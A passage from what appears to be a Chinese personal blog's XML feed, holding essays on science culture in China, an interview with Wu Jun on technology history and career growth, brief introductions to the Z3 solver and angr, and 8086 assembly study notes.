），最近一本叫《社会需要意义》。为什么每个人在企业里面都做得很多，都觉得很焦虑，因为没有充实的意义，如果每天去上班，你都觉得在做一件非常有意义的事情，生活很充实，会给每个人带来很大好处。 我在上学时就意识到几个事。一是寒门出贵子是小概率事件，大部分富二代，尤其是官二代非常优秀。二是田忌赛马，在整体资源劣势的情况下可以创造出局部优势，进而有机会获得整个战役的胜利。基于此，平凡人可以成就平凡事。第三是钱是工具，不是目的。 我在上学时有一个较大的遗憾，就是自己目标导向太明确，在追求第一、努力做个好学生上浪费了过多时间，损失了逆反、捣蛋的青春时光，后来才慢慢悟到“60分万岁是个好哲学”。 当时我有两个困惑，第一，书本上的知识为什么要 老师教才会？第二，这么多的学生，七点半起床，八点上课，很多人眼睛还没睁 开，这样听课是不是有效率？这两个问题困扰我一阵子后，我毅然决定每天从第二堂开始上起。 因为我没有听第一堂课，又不得不做作业，所以我会努力去看老师上一堂讲的东西，也会很努力地去想老师想给我传达什么信息。很快我掌握了一种思考的 技巧：完全不听别人讲，就看书本，我竟然可以在两三个星期内掌握一门功课。后来接触到互联网的时候，我才知道这种技巧对我是多么重要。我从 1997 年开 始搞互联网，那时没有几个人能教你互联网是什么，关于互联网的书也非常少， 要请别人吃饭才能借到，而且看书的时候要不停做笔记。所以那时候我每天去网 上输入各种各样的关键字查找，然后把这些信息打印出来，放在脑袋里去组合， 去搅拌。大学的学习过程对我后来创业影响非常大。可以坦诚地说，我在大学学 到的知识在后来的工作中基本没有用到过，但我在大学四年培养出了思考的能力 和学习的能力。我现在看书很快，一般都从后面往前看，看关键字，不懂就到前面去看这个关键字的描述。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[饶毅：赛先生在中国还是客人么？——“赛先生”创刊致词]]></title>
    <url>%2F2019%2F07%2F18%2F%E9%A5%B6%E6%AF%85%EF%BC%9A%E8%B5%9B%E5%85%88%E7%94%9F%E5%9C%A8%E4%B8%AD%E5%9B%BD%E8%BF%98%E6%98%AF%E5%AE%A2%E4%BA%BA%E4%B9%88%EF%BC%9F%E2%80%94%E2%80%94%E2%80%9C%E8%B5%9B%E5%85%88%E7%94%9F%E2%80%9D%E5%88%9B%E5%88%8A%E8%87%B4%E8%AF%8D%2F</url>
    <content type="text"><![CDATA[饶毅：赛先生在中国还是客人么？——“赛先生”创刊致词** 「要改善我国的科学，不仅需要改革体制，而且需要改进文化。」 饶毅（北京大学教授） 作为观念的“德先生”（democracy）和“赛先生”（science）进入中国，曾被认为是新文化运动的两面旗帜。“五四运动”九十五周年的今天（编者注：此文写于2014年）：“德先生”踪影难觅，“赛先生”身份不明。 对“赛先生”的争议，表面上看早就没有了。虽然不能说中国毫无科学思想之萌芽，但近代意义的科学基本是舶来品；虽然不能说中国人完全缺乏对自然现象及其规律的关注，但那种出于好奇心对自然奥秘的求索在传统文化中隐而不彰，而与科学密切相关的技术常被负面视为“奇技淫巧”。今天仍待商榷：科学在精神上是否根植我国文化，科学在实质上是否成为我国发展的支柱？ 在各种条件改善的今天，我们需要知耻而后勇。2014年5月，美国副总统拜登批评中国连一个创新都没有。就算术而言，他显然错了；就现代生活而言，我们的原创性贡献确实与泱泱大国的地位不相称。主要原因，恐怕不在于科学研究成果的转化和应用有问题，而是科学基础的薄弱和创新动力的缺乏。 我们还要看到社会环境变化引起的新问题：离全面小康尚有距离，而青少年对科学的兴趣已呈下降趋势，可能成为中国科学后继乏人的征兆。如不未雨绸缪，恐怕尚未小富即安，抑或将出现危机。 中国科学三十年赶上日本仍然是很大的挑战，百年内全面成为世界一流并非定数，达到二流后停滞不前不是并非不可能。 传统阙如 文化和科学史显示，中国古代从军事谋略到诗词歌赋等都有创造性，也有包括四大发明在内的原创技术，但我国传统文化对自然现象及其规律的关注，在广度和深度上均长期远远落后于西方。 所谓“中国古代科学先进、明清才衰弱”的说法并不符合历史实情。那是有些人出于良好愿望而编造出来的，通过英国学者李约瑟出口转内销而起到一定作用，包括良性作用。这是我国近代意识到落后情况下的自我鼓励，如果现在还用就是自我麻痹。 两千年前，中国没有欧几里得几何学式的系统性、严密性、合谐性与完备性；今天，世界上绝大多数教科书中基本没有中国的贡献，中国教科书含中国首创的内容也极少，皆因中国的科学不强。 西方科学传入中国，曾经历过短暂的冲突。例如，清初坚决反对地圆说的杨光先（1597-1669）著《辟邪论》，以自己的无知抨击从西方引进的科学为邪说，还振振有词地高呼“宁可使中夏无好历法，不可使中夏有西洋人”，攻击主持钦天监工作的传教士，以致于1665年德国人汤若望（Johann Adam Schall von Bell, 1591-1666）等被清廷判凌迟死刑，只是彗星的出现等原因救了汤若望一命，实践证明汤若望等引介的“西洋新法”更为准确。杨光先因直接上书皇帝“摘谬十论”和“请诛邪教”被委以钦天监正，而他对天文历法一窍不通，最终落得个革职杖流的下场。 我们重温令人汗颜的史实，是为了今天不沉浸在虚构的古代辉煌中自我心理按摩，而要立志在百年内彻底改变我国科学落后的面貌，也要警惕几百年来以不同形式出现的民粹主义和极端民族主义干扰中国现代化和中华民族复兴的进程。 历史局限 中国的科学无疑得益于“西学东渐’。 自十六世纪末利玛窦（Matteo Ricci，1552-1610）、徐光启（1562-1633）前后两百多年，中国对科学的态度以冷漠为主。 近代科学大规模进入中国多在十九世纪六十年代以后。一项很重要的工作是翻译包括教科书在内的各种科学书籍，一直持续到1950年代。而建立西式小学、中学到大学的现代教育全面布局，到1950年代方具规模。1990年代后期到2000年代初期大学规模扩大，高等教育愈加普及。 1949年以前，中国人虽然逐渐在小学、中学阶段开始接受科学教育，不过受教育者更多可能是以科学知识作为升学和就业的门槛，以致在相当长时间里，很少人对科学感兴趣，而对读书做官、读书发财趋之若鹜。 民国时期在经济能力有限的情况下，我国科学步履蹒珊，少数例外如清华大学在数学方面一马当先，美国洛克菲勒基金会资助的协和医学院在生物医学方面独树一帜。1920年代后期成立的中央研究院、北平研究院等，其建筑甫经启用就因日本入侵而搬迁内地而没有很好地发挥作用，二战后也很少有几年是和平工作时期。整体而言，1949年以前中国原创性的科学研究极为有限。 1950年至2000年的五十年可能是全中国从国家、社会到个人对科学热情最高的时期。毛泽东、周恩来发出“向科学进军”的口号，促进大众对科学的尊重和热情，这是当时社会热衷科学的高尚原因。但不可否认，社会热衷科学还有实际原因：大凡以前做官发财者在1949年政权更替后的悲惨命运，使中国社会对人文和社会科学心怀恐惧，间接导致人们倾向自然科学和工程技术。那时流行的“走遍天下都不怕”即是彰显自然科学，也是全国人民对人文社科避之不及的心态写照。 毛周时代将有限的经费集中用于中国科学院等专门研究机构，而高校在多数学科领域处于科学研究的边缘。这一时期，虽然“两弹一星”等应用性项目带动了相关自然科学学科的发展，也出现如人工合成胰岛素等基础研究的成就，但总体成就仍有限。 毛泽东时代的最后十年，大学、研究所即使没有停办，也很少能正常运行，大批知识分子受打压。虽然毛泽东本人似乎区别对待理工和人文社科，但他并未说清楚，理工科和人文社科同等被批判，直接导致自然科学研究全面滑坡。自然科学的教育也全面退化：中学曾有几年无物理、化学、生物课，代之以“工业基础知识”和“农业基础知识”，注重养鸡、养猪、养牛等，为青少年成长为农民做准备。 1976年毛泽东去世后，全国逐渐复苏。邓小平等首先支持科学和教育，国家科委工作人员以郭沫若名义发表的“科学的春天’激励了无数青少年。但是，明显的国内外差别导致1980年至2000年这二十多年的人才外流，其中以“走遍天下”的自然科学人才首当其冲，有些中国机构出现有位置无人竞争的局面。 1998年，国家有一定经济实力后支持高校的“985工程”计划（亦称“创建世界一流大学计划”）和科学院的“知识创新工程”，目的是缓解自然科学人才青黄不接状况的救急救贫措施。彼时口号虽很大，但并没有几个人真认为中国能“建设世界一流大学”，杨振宁先生甚至认为中国即使建设“研究型大学”也不切实际，国内科技教育界领袖并不清楚国家对科学的支持能否长久。 现实不美 2000年后，国家经济稳定发展态势明显，对科学和教育的支持有广泛的共识。 2003年“985计划”和“知识创新工程”获第二期资助，科学研究走出谷底，一些高校和科研机构开始不再忧虑如何救急，而认真思考自身和中国的科学发展。 也就是说，科学进入中国的几百年来，其实不过近十几年才告别“口号强、行动弱”的时期，有实力思考中国科学的发展。 近十几年来，国家对科学的投入稳步增长（包括有些年代、有些领域投入大幅度增加），人才逐渐回流，科学成果数量增加、质量改善。但是，在科技体制、成果转化和科学文化等诸多方面尚不尽人意。 体制上，科技体制改革有限。许多资源掌握者没有管理好国家的经费，相当一批官员顽固地视国家科学经费为其权力来源，不仅不积极借鉴国际经验，也不推广国内成功的实践。 社会上，有些人对科学实质了解不够，希望中国不打好地基就建楼，急切要求将研究转化为应用，甚至讥笑和抨击基础研究，不知道先进国家在相当大量和高质量的科学研究后，才产出少量有应用价值的成果。我国将不成熟的国内外研究成果莽撞地进行转化的情况多于国外，有时在国外已被证明不能转化的东西，却在我国被善于忽悠者用于牟取私利。这些“转化”无法长久，也不可能有国际竞争力。 文化上，科学精神很难说已经深入人心。在科学界，迄今未能解决创新需要冒尖的文化与我国传统中庸文化的冲突，种种落后的习俗与不良的人际关继续制约着科学人才发挥作用。在科学界以外，不科学的东西在中国社会很容易流行，反科学的东西也不时冒出来，有时甚嚣尘上。 因此，对于我国科学和创新迄今不如人口不足八百万的瑞士，就不会感到奇怪。 前景有忧 科学进入中国几百年来，学习为主、创造很少。学习国外的科学知识，可以使我国具有技术引进和工艺改造的能力，从加工基地成为制造基地，还在为国外的设计打工，附加值在低水平徘徊。要让科学为我国自主知识产权的新技术、新产业提供支柱和动力，还需要付出很大的努力。 要改善我国的科学，不仅需要改革体制，而且需要改进文化。科学史显示：对科学家不能求全，而要求尖；在合法和合规的情况下，提供自由创造的环境，任其飞翔；“枪打出头鸟”的社会习俗是科学创新的死敌。 在中国科学似乎进入快速发展期的今天，也需看到：近十几年来，中国社会和青少年越来越热衷于付出少而收获大的职业，对科学的热情越来越小。这不限于国内的学子，也含海外华人。也就是说，我们旧问题还没有解决，又出现了新问题。可能导致的后果是：我国科学的最高峰就在今后三十年内，原来有热情的人继续努力形成中国科学上升的曲线，而后继人才短缺形成科学的平台期或下降的曲线，它们的交汇或许将决定我国科学未来走向。 如何避免下降的曲线不仅是科学界的问题，而是中国社会的问题。未来的中国固然毋需如1956年或1978年般全社会对科学的热情，但如果我们很快就变成低于美国2010年代对科学的热情，在2049年赶不上2014年的日本，中华民族在科学上是否会“未老先衰”？我们希望中国科学上升的曲线不止三十年，但不能仅仅依赖盲目的信念，而要改革体制提高效率、并想方设法消除潜在危机。 问题深层 科学不仅与技术发明、经济基础密切相关，也是文化的要素。 在我国，科学能否成为文化的核心之一，问题可能还很大。我们对真理的追求，对自然的好奇，对逻辑的严密，对事物的客观……都“仍需努力’。科学所要求的诚实、怀疑、开放、宽容、求真、合作……也是我国社会文化建设的重要内容。 毋庸讳言，曾表面上与“赛先生”在中国同行一段时间的“德先生”至少是被冷藏了。毛泽东和邓小平等表示过认同“德先生”，但认为我国国民的素质不够、付诸实践的时机未到。他们去世后，“德先生”是被暂时搁置，还是永久弃之，对此无公论。苏联证明，“德先生”缺位几十年，“赛先生”仍可获相当大的成功。但“赛先生”能独行多久，全世界无数据。 探讨中国的科学文化，希望有助于中国的科学早日达到梁启超先生对中国学术的期许：“研究高深之学理，发挥本国之文明，贡献于世界之文明”，也有益于科学精神进入中国文化的内核。 到那时，“赛先生”在中国肯定不再是客人。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Z3约束求解器]]></title>
    <url>%2F2019%2F07%2F14%2FZ3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[如果高中数学给我们用Z3就好了 0X00:IntroductionZ3求解器给我们提供了一个非常便利求解方式，我们只需要定义未知量（x,y等），然后为这些未知量添加约束方式即可求解。 0X01:基本用法x = Int(‘x’) y = Int(‘y’) solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 首先要定义要求解的几个参数，然后用变量把核心的方程搭建出来，之后就会自动求解，最后打印出来就行。 基本的框架如此，具体的代码还是要多在实际中写。虽然CTF逆向比赛中重点考察的是逆向的能力，采用求解器的方式来求解并不能锻炼到自己的逆向逻辑，自己肝才是大佬。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr]]></title>
    <url>%2F2019%2F07%2F14%2Fangr%2F</url>
    <content type="text"><![CDATA[0X00:Introductionangr是一个二进制代码分析工具，能够自动化完成二进制文件的分析，并找出漏洞，是一个基于python的二进制漏洞分析框架，它将以前多种分析技术集成进来，­­­它能够进行动态的符号执行分析，也能够进行多种静态分析。 0X01:基本过程 将二进制程序载入angr分析系统 将二进制程序转换成中间语言 将IR语言转换成语义较强的表达形式 执行进一步的分析 0X02：用法angr-CLE：首先加载二进制文件，在加载二进制文件的时候会分析病读取binary的信息，包括指令地址、shared library、arch information等等。 import angr b = angr.Project(“./test”) angr_IR：angr用VEX IR将指令转化为中间语言IRangr-Solver Engine： import claripybv = claripy.BVV(0x41424344, 32) ArchInfoArchinfo是包含特定于体系结构的信息的类的集合。例如，little-endian amd64、little-endian i386。 PyVexPyVex是中间语言，Angr使用Valgrind的中间语言——VEX来完成这方面的内容。VEX中间语言抽象了几种不同架构间的区别，允许在他们之上进行统一的分析。各种中间语言在设计理念上有很多的共通点 SimuVEXSimuVEX模块是中间语言VEX执行的模拟器，它允许你控制符号执行。 Angr是一个很强大的工具，对进行过代码混淆的代码，无法在IDA中反编译，但能够用这个工具。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019/7/13]]></title>
    <url>%2F2019%2F07%2F13%2F2019-7-13%2F</url>
    <content type="text"><![CDATA[在微信公众号”赛先生”上看到的一篇文章，采访对象为吴军，原腾讯副总裁，Google中日韩搜索算法开发者。对这个人挺感兴趣的，兴许后面会把他写的书都看一遍。 以下为摘录： [TOC] 个人成长的关键在于做减法和走出舒适区 吴军善于利用时间，做事高效，繁忙的工作之外，先后创作了《数学之美》、《浪潮之巅》、《文明之光》、《见识》等书。他兴趣广泛，喜欢摄影、音乐、园艺等，而不同机构的工作经验，多年游历欧美的经历又使得他对事物有着独特的思考和看法。 在最新出版的《全球科技通史》里，吴军描绘了远古到现代几万年间科技发展的景象，以科技的视角重新审视人类走过的历史，并试图洞察我们所处的位置，看见可能的未来。 Q：**人类科技力量真正爆发是在工业革命之后，工业革命离不开政治制度的变革、宗教的改革、以及金融制度的创新，这些因素在人类社会中的作用在书中似乎被有意忽略了？** A：**这些因素不是有意地忽略了，而是被很多人高估了。那些所谓政治方面的影响，如果没有某个政治制度，就不会有这个科学成就，这种说法其实没有多少统计数据来证明。人类科学的发展有几个高峰，古希腊是一个高峰，伊斯兰文明是一个高峰，科学启蒙以后是另外一个高峰，每次的政治制度都不一样，造成科技高峰的政治制度是不一样的。很多时候有的人讲，因为我的政治制度促使了科学技术地发展，这只是自己往自己脸上贴金。** 我们举个例子，在英国伦敦不远的地方有一个城市叫巴斯，那里有古罗马很奢华的一个浴场。在工业革命之前，英国最上流，最有钱的人在那儿度假生活。通过那儿的博物馆可以了解当时英国最上流的生活，你会发现他们比今天中国中产阶级的生活可差远了。比如，他们没有机会每天洗热水澡，他们的头上会长虱子，女主人就用特别细的，金属钢针式的一个梳子刮头发。他们喝下午茶的茶叶都是要锁在柜子里的，因为那个茶叶实在太少太金贵，生怕女佣人给偷了。当时也没有冰箱，食物腐烂都不用讲了，而这是当时英国最好的家庭。你会发现2000多年来，上流社会的生活没有什么差别和改进。英国的政治制度从各个小城邦的封建制，到君主专制，再到君主立宪的议会制，换了一茬又一茬，宗教和法律也是一样。这些东西换了一茬又一茬，并没有用。一旦真正工业革命开始以后，一切就都不一样了。 Q：**每一次工业革命受益者往往是那些掌握核心技术的人，面对当下所谓的智能革命，大多数人的机会在哪里？** A：我们要明确一个前提，世界永远不是公平的，人类发展到现在从来没有发生过这种情况，也不要指望将来能这样，就是有人受益多一点，有人受益少一点，这是一个必然。掌握核心技术的人，最早投资的人，肯定是受益的，这个可能也就占人口的1%或者2%。剩下来可能里头的少一半人，他们率先或者使用技术，把原有的一个产业变成一个新产业，他们就能够受益，这部分人会很多，所以我在这本书里面讲了好多工业革命的范式。就是你要把现有产业通过率先使用新技术变成一个新产业，然后从中获益。我举了很多例子，比如说，瓷器大王韦奇伍德，他不懂蒸汽机，他也不研究蒸汽机，但他使用蒸汽机，他把传统的瓷器制造业变成了一个新的产业。 Q：**书中讲科技几乎是世界上唯一能够获得叠加性进步的力量，个人应该如何利用这种叠加性获得自我的成长？** A：我想从两个方面来谈这个问题。一个是做减法，人想做的事情很多，而你能做的事情是有限的，判断这件事情该不该做，不是盯着眼下这一点利益，而是说我做了这件事情以后，对我以后做更大的事情有没有帮助？ 假如说你是个程序员，有一个同学找上你，给你2万块钱，你帮我开发一个小程序吧，你觉得，这2万块钱花我一点时间可以有一个额外的收入，你就去做了。但你做这个事情可能会有一个损失，你单位里面本职的事情可能会受到影响，这2万块钱你是挣了，接下来这个事情对你整个职业生涯的发展是没有帮助的，或者说没有太大的帮助，这种事其实不值得做。我有时候老说，你如何在北京或者深圳买得起一套房子，就是你得有办法让你的收入将来能够两倍、四倍、八倍这样往上增长，否则你收入的增长总是赶不上房价的增长。所以你老是今天帮张三做一个2万块钱的小程序，明天帮李四去修一台计算机，那你一辈子都是在低水平的重复。 第二个就是人要走出一个舒适区，你能够慢慢挑战做一些更大的事，比如说编程序，这个程序你慢慢写的比较熟了，好像原来觉得很辛苦，现在每天早九晚五上下班应付起来没问题，那你整个人的进步还是线性的，你多工作一天多赚一天的钱。这时候你应该挑战一下自己，这里头有没有别人没有解决的问题，我能够解决一下，有没有什么新的东西，我学会了以后可以把这个事情做得更好，或者说我过去关注的只是某一个系统的一部分，我能不能关注一下整个系统，挑战一下自己的能力，走出舒适区，这样的话你会越做越大。 Q：**在面临重要人生十字路口时，应该如何去抉择？**哪些因素是应该关注和考虑的呢？ A：每个人的情况不一样，所以不好给一个确定的答案。但是对于刚毕业的人我常讲一条就是你不要看一开始的工资是否多了20%，而是你有没有一个学习和成长的机会。正在工作中的人，每个人的情况不一样，标准也不一样。但是有两个原则，第一个是你这次选择以后，5年以后会不会变得更好。另一个需要考虑的就是这个选择是不是一个跟风的一个选择，坦率地来讲，所有跟风的选择你都没有什么机会，因为太拥挤了，你是否找到了一个特别适合自己的专长，能够发挥自己的专长，这非常重要，而不是简单地跟风。例如人工智能一热，很多人就考虑我是不是该去当程序员，或许不一定，你在别的领域发挥作用或许更有意义。 Q：**你是如何在繁忙的工作当中横跨这么多领域的？**在时间管理上面有没有什么独到的心得？ A：**从战略上讲，时间管理上的心得就是你要少做事，人不在于你1月1号开始了多少件事儿，而在于12月31号你完成了多少件事。从战术上来讲，我写书的时间恰恰用的是我碎片化的时间，我随身带着笔记本。很多人用碎片时间看微信，我这都是用整时间来处理的，微信和手机这种东西并不是说让你利用碎片时间，而是把你所有的整时间，都变成了碎片时间。所以我一般是每天固定几个时候处理一下微信的内容，不会随时看，这样能够提高效率。** 至于为什么会有这么多地关注，这是一个自然演变的结果，最早做技术，后来你要考虑产品有没有市场，就开始研究商业，商业研究多了，《浪潮之巅》这些书就是这么写出来的。对文明，对科技这些东西我是一直感兴趣，《文明之光》实际上是我看到世界上各个不同时期，各个不同地点的文明后发出的一种由衷的感叹。写历史类的书你总要表达出一种史观，有人说我这个是反英雄主义史观的，不管是什么标签，你总要传达一个意思，那么科技通史其实也是一种史观，就是科技在人类历史上的一个重要地位。这是我想表达出来的一个意思。 Q：**在写作过程当中，你应用了大量的历史学方法，学习历史的意义是什么呢？** A：我有时候老讲一个观点，就是说学历史有两个误区，一个就是把它当成听故事，这也不是说不好，但是这个远远不够。第二个误区就是通过对历史一些很简单的总结，好像就觉得能够指导未来的一个什么事情，这其实也很难办到。因为历史很难跟以前完全一模一样地重复一遍，以前的一个结论是在一个非常有限的信息得出一个合理的解释而已，所以我们有些人简单地从历史当中总结经验教训，这个也是不可取的。 但是历史整个发展的脉络，对于我们了解未来是有帮助的。比如说，在任何一次工业革命中，新技术如何和原有产业结合诞生新技术，我们应该怎么做，你就能够获得机会。科学方法使我们能够获得一个叠加性的进步。我们每一个人做事都应该讲究一个科学的方法，这些东西你是可以学到的。这就是为什么要讲历史的主要原因，讲历史不是为了讲过去的故事，而是为了对我们今后的发展有启迪。 Q：**在这本书的《后记》中，你提到了看待历史的大历史方法。**你为什么专门强调了这一点？ A：这是我最后对书的一个概括，虽然这个书里面我讲了好多细节，但是实际上我想告诉大家细节不重要，这个历史的轮廓最重要，甚至我讲的这些发明发现，再过若干年可能会有新的考古和研究证据，但是整个历史的发展趋势是确定的。我想给大家的是一个轮廓，而不是某一个具体的细节。 大历史观研究一件事的时候，他会把这件事放在一个很大的时空中来看，在一个很长的时间维度，很大的空间维度上能够看到这样一件事情的一个作用。比如说，黄仁宇写的《万历十五年》，他把那个时间点的明帝国，放在整个中国很长的一个历史维度中来看，明朝为什么走向了一条不归路。放在一个空间维度来看，当时全球贸易已经起来了，明帝国位于什么样的一个位置。 历史是一个方法，你也可以采用这个方法来看待这些事，比如说，你可以把5G放在一个很长的时间上来看，从1G〜5G它在沿着哪个方向发展，那你就可能知道5G未来的发展方向是怎么样的，你可以把5G放到一个通讯的角度上，放在全世界信息交流这样一个空间的维度上，去研究5G扮演着一个什么样的角色。所以历史研究很重要的不是给你一个结论，而是给你一个方法。 Q：**当今世界保守势力抬头、中美贸易摩擦都让全球化的进程受到了挑战。从大历史观的角度来看，世界是否处在了一个变革的十字路口？对世界的未来走向，你有什么看法？** A：这就谈到了大历史，因为大历史的时间维度常常是比较大的，如果在整个人类科技发展的长河来看，这一两年发生的事，有一点之前轨迹不同的小变化，这个真的算不上一个事，大家有时候过度担心了。一百年在历史的长河中上算不上长，这一百年里发生的重要事件有很多， 1949年建国，后来中美建交，冷战结束，中国入关，哪件事都比当下这点事大，大不知道多少倍。你今天回过头来看那些事，好像都是很久远的事情了，没有什么印象了。中国就是在这样不知不觉中持续发展过来的，人类文明的走向也不会因为当下这点事发生什么变化。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编]]></title>
    <url>%2F2019%2F07%2F12%2F%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[下学期开课，复习一下。 1.指令与数据在内存中的都是以同样的二进制流存放的，区别之处在于是从哪根总线（数据总线/控制总线）传入。2.地址总线宽度决定CPU的 寻址能力。2的N次方个。数据总线的宽度决定了数据的传输速度。控制总线的宽度决定了控制能力。3.核心思维：从CPU的角度去考虑问题。4.寄存器中，数据是采用的小端序存储。5.AX=AH+AL，EAX是32位寄存器，AX是16位，AH/AL是8位6.汇编指令不区分大小写。7.8226H+8826H，在ax中就会变成044C（本来是1044C），多出来的1会在标志位中显示。注意对AH和AL运算时，不能越界。8.8086的CPU内部结构为16位，只能传送16位的地址，所以寻址能力只有64K。但是其地址总线的宽度为20位，寻址能力有1M。所以采用16位段地址与16位偏移地址，经过地址加法器合并为20位的物理地址后，再进行输出。 9.地址加法器的工作原理：物理地址等于段地址X16（即在末端加上个0，数据左移4位。）再加上偏移地址。10.一个数据的X进制形式左移一位，即相当于乘上X。11.CPU中的内存是连续的，但是人为的划分可以分成段。段地址X16可以得到基础地址，加上偏移地址得到物理地址。12.偏移地址为16位，所以允许的一个段的长度最大为64K。13.CPU可以通过不同的段地址与偏移地址形成一个物理地址。14.数据在一个存储单元中，可以有两种不同的表述：如数据被存储在21F60H的存储单元中，可以表示为”数据在内存2000：1F60H。”也可以表示为”数据在内存的2000段中的1F60H元中。 15.可以根据需要，将一组连续的且起始地址为16倍数的内存空间定义为一个段。16.段寄存器就是提供段地址的，8086CPU有4个段寄存器，分别是CS（code），DS（data),SS(stack),ES(extra)。17.一个宏观的想法：无论是程序还是数据，当其加载到内存中之后，都是一段二进制代码流。其中的一部分由控制总线传入转化成命令，其中的一部由数据总线传入转化成十六进制数据。18.CS与IP，为8086CPU最重要的两个寄存器，指示了CPU当前要读取的指令的地址，CS为代码段寄存器，IP为指针寄存器。 即任意时刻，CPU将CS:IP指向的内容当作指令执行。19.物理地址从地址总线传到内存中后，读取内存单元中存放的指令，指令通过数据总线途经输入输出控制电路，到达指令缓冲器。且读取一条指令后，IP的值会自动增加，使CPU可以读取下一条指令（根据当前读取的指令长度而加上该长度到达下一条指令位置。）。20.能够改变CS/IP内容的指令被称为转移指令；最简单的转移指令：jmp。jmp 段地址：偏移地址，课将CS和IP修改到指定值。同时jmp+某一合法寄存器的值可只修改IP。21.sub，减法运算。sub ax，bx，即为ax-bx。22.内存中字的存储：高位对应高低址位，低位对应低地址位。所以对于一个内存单元中的数，应该从下往上读取。23.字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。24.mov指令还可以将一个内存单元中的内容送入寄存器。mov 寄存器名，内存单元地址。[…]表示偏移地址，另外确定内存单元所需的段地址由DS决定（一致）。将寄存器中的内容送入内存单元表示为：mov […]，寄存器名。25.8086CPU不支持直接将数据写入段寄存器，必须先通过改变其他寄存器的值，然后寄存器与寄存器间进行操作，才能改变段寄存器的值。 指令中只写偏移地址，段地址需要在事先改变。26.mov的用法小结：mov 寄存器，数据/mov 寄存器，寄存器/mov 寄存器，内存单元/mov 内存单元，寄存器/mov 段寄存器，寄存器/mov 寄存器，段寄存器。27.类比代码段得到数据段的定义方法：将某为16倍数的地址作为首地址，不超过64K的长度作为数据段长度，把dx段寄存器改为首地址即可。28.字型数据–&gt;偏移地址差为2位。29.现如今的CPU都有栈的设计，8086CPU提供相关指令以栈的形式访问内存，所以在基于8086CPU编程的时候，可以将一段连续的内存空间作为栈使用。30.从程序化的角度来看，必须有一个指针指向栈最上面的元素。 31.如何知道一段内存空间被当作栈来使用？如何知道接下来要操作的栈中数据哪个是在栈顶的。类似于CS:IP,8086CPU中，SS：IP始终指向栈顶。32.栈顶指针可以指到最底层。33.POP或者PUSH指令，在两种极端情况下都会造成栈溢出。34.栈是一种可以被特殊访问的内存空间。35.PUSH指令和POP指令，可以在内存与寄存器之间传递数据，也可以在寄存器与寄存器之间，内存与内存之间传递数据。由于栈中的操作对象（栈顶指针所指向的字型数据确定，所以在指令中只需写偏移指令或者寄存器名称。36.栈顶清零不能用MOV AX,0。要用SUB AX,AX。 37.将10000H~1000FH的空间当作栈的初始化汇编代码：mov ax,10000Hmov ss,axmov sp,0010H ss是段寄存器，不能被直接赋值。注意后面栈顶指针的指向，实际上已经超出了栈的范围，在栈底的下面一位更高地址。38.push ax是入栈指令，它将在栈顶之上压入新的数据。一定要注意其执行过程是：先将记录栈顶偏移地址的SP减2，使得SS：SP指向新的内存单元，然后再将数据写入内存单元中。39.我们要十分清楚的是：push和pop指令与mov指令不同，CPU执行mov指令只需一步操作，即传送。而执行push指令时，实际上有两步操作：先改变SP的值，后向SS:SP处传送。执行pop指令时，先读取SS:SP的数据，再改变SP的值。 40.为什么栈的长度最大只有64K？与数据总线是16位有关。64X1024=2的16次方。41.数据段没有指针，直接用偏移地址。 42.伪指令，伪指令无法被编译成机器指令被CPU执行，由编译器执行。segments和ends是一对成对使用的伪指令，这是在写可被编译的汇编程序时必须要用到的伪指令。segment和ends的功能是定义一个段，segment说明一个段的开始，ends说明一个段的结束。 段的使用格式：段名 segment： 段名 ends43.一个汇编程序是由多个段组成的，这些段被用来存放代码，数据或者被当作栈空间。一个源程序中，所有将被计算机所处理的信息即指令，数据，栈被划分到不同的段。44.ends与segments配对使用，分别表示段的开始与结束。end与ends是两个不同的概念，end是整个程序的结束。45.assume指令，将有特定用途的段与相关的段寄存器联系起来。比如用assume指令将代码段与CS联系起来。46.源程序：源程序文件当中的所有内容。程序：源程序中最终由计算机处理的指令或者数据。47.与C语言类似，汇编中除了汇编指令，伪指令外，还有标号（段名）会在被编译的时候，转变为内存地址。48.程序返回：一段汇编指令被编译成机器码储存在可执行文件中，要想运行必须载入内存。在dos单个任务操作系统上，必须先有正在运行的程序P1，将CPU的控制权交给P2后，P2才得以运行。所以一个程序结束运行后，必须将CPU控制权交给下一个程序，这个交换的过程成为程序返回。代码：mov ax，4c00Hint 21H49.源程序在编译的过程中被发现的错误称之为语法错误，编译完成后执行时发生的错误为逻辑错误。50.asm，汇编源程序的扩展名。51.源程序被编译后，可以得到obj（目标文件）/lst（列表文件）/crf（交叉引用文件）52.53.要完整地描述一个内存单元，需要两种信息。一是内存单元地地址，二是内存单元存储的长度（数据类型）。用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认存储在ds中，单元的长度类型可以由具体指令中的其他操作对象比如寄存器指出。类似的，[bx]也表示一个内存单元，其偏移地址在bx中。54.（bx）表示bx中的内容。 （）中可以有三种类型，寄存器名，段寄存器名，内存单元的物理地址。 由此可知，（X）中的数据类型有两种，字或者字节。 15.注意push与pop指令对sp操作的先后顺序。56.[idata]，表示数据 57.mov ax，[bx]表示把bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SA:EA处的数据送入ax中。mov [bx],ax表示把bx中存放的数据作为偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。58.inc表示自增。59.cx与loop指令直接关联，存放循环的次数。60.cx的使用：mov ax，2mov cx，11s：add ax，axloop 